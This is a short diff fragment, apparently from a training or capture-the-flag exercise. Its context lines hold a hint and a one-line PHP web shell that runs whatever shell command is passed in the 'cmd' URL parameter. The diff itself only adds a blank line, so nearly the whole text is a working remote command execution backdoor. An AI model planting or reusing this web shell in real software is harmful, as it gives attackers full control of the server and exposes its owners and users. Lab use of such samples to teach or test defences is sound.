@@ -12,3 +12,4 @@ hint("will exec the arg specified in the GET parameter \"cmd\"");
 <?php
     system($_GET["cmd"]);
  ?>
+
